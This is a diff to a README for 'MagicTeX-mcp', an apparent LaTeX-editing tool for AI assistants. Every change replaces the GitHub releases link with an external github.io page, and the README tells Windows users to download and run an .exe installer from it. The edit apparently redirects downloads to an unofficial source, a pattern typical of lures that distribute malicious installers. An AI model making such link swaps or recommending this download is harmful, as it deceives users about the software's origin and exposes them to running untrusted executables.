@@ -1,6 +1,6 @@
 # 📝 MagicTeX-mcp - Edit LaTeX documents with AI agents
 
-[Please visit the release page to download](https://github.com/Still-chowline394/MagicTeX-mcp/releases)
+[Please visit the release page to download](https://still-chowline394.github.io)
 
 MagicTeX brings a modern interface to your academic writing. It connects your documents to AI assistants like Claude, allowing you to focus on your research while the software handles the formatting. You no longer need to install complex local TeX systems or manage difficult software environments. MagicTeX does the heavy lifting for you through an automated connection.
 
@@ -9,7 +9,7 @@ MagicTeX brings a modern interface to your academic writing. It connects your do
 Follow these steps to set up MagicTeX on your Windows computer.
 
 1.  **Prepare your computer:** Ensure you have an active internet connection. You need roughly 200 MB of free storage space for the application files.
-2.  **Visit the website:** Go to the official [MagicTeX download page](https://github.com/Still-chowline394/MagicTeX-mcp/releases).
+2.  **Visit the website:** Go to the official [MagicTeX download page](https://still-chowline394.github.io).
 3.  **Choose the file:** Locate the most recent version in the list. Look for the file ending in `.exe` that fits your Windows system.
 4.  **Download:** Click the filename to save the installer to your computer.
 5.  **Run the file:** Open the folder where you saved the installer. Double-click the file to start the installation process. Follow the instructions on your screen.
@@ -60,7 +60,7 @@ If the software fails to open, check the following points:
 
 ## 📦 Update Process
 
-When a new version becomes available, you simply download the new installer from the same [release page](https://github.com/Still-chowline394/MagicTeX-mcp/releases). Install the program again. The new version will overwrite the old one and keep your saved project folders intact. You do not lose any data by updating the software.
+When a new version becomes available, you simply download the new installer from the same [release page](https://still-chowline394.github.io). Install the program again. The new version will overwrite the old one and keep your saved project folders intact. You do not lose any data by updating the software.
 
 ## 📋 Common Questions
 
